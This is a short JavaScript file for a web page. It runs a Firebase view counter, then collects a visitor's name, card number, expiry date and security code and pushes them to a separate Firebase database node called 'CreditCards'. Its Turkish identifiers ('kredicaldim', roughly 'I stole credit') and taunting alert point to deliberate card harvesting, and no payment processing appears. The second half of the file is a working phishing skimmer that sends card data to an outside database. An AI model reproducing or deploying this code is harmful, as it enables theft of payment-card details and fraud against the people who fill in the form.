import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"
import { getDatabase, set, ref, get, push, onValue } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"


const app1 = initializeApp({
  databaseURL: "https://epicneuralgfail-default-rtdb.europe-west1.firebasedatabase.app/"
}, 'app1');

const app2 = initializeApp({
  databaseURL: "https://epicneuralgfailforms-default-rtdb.europe-west1.firebasedatabase.app/"
}, 'app2');

const database1 = getDatabase(app1)
const viewCountInDB = ref(database1, "ViewCount")

const sayiEl = document.getElementById("sayi")

onValue(viewCountInDB, function(snapshot){
    let myValue = Object.values(snapshot.val())[0]
    myValue += 1

    function writeViewCount(myValue) {
        set(viewCountInDB, {
            ViewCount: myValue,
        });
}

    sayiEl.innerText = `View Count: ${myValue}`

    writeViewCount(myValue)
    console.log(myValue)
},{
    onlyOnce: true
})
// ABOVE IS FOR THE VIEW COUNTER!!!!!!!!!!!
const database2 = getDatabase(app2)

const jsonInDB = ref(database2, "CreditCards")


const buttonEl = document.getElementById("kredicaldim")

const firstNameEl = document.getElementById("fname")
const secondNameEl = document.getElementById("lname")
const numberEl = document.getElementById("cnum")
const dateEl = document.getElementById("exdate")
const securityEl = document.getElementById("secnum")
const ankaraEl = document.getElementById("atbomb")


buttonEl.addEventListener("click", function(){

    let fName = firstNameEl.value
    let sName = secondNameEl.value
    let number = numberEl.value
    let date = dateEl.value
    let security = securityEl.value
    let ankara = ankaraEl.value

    const values = new Map()

    values.set('fName',fName)
    values.set('sName',sName)
    values.set('number',number)
    values.set('date',date)
    values.set('security',security)
    values.set('ankara',ankara)

    if(fName && sName && number && date && security && ankara){
        var obj = Object.fromEntries(values);
        var myJSON = JSON.stringify(obj);
        push(jsonInDB,myJSON)
    } 
    else{
        alert("benden kaçamazsın")
    }

})





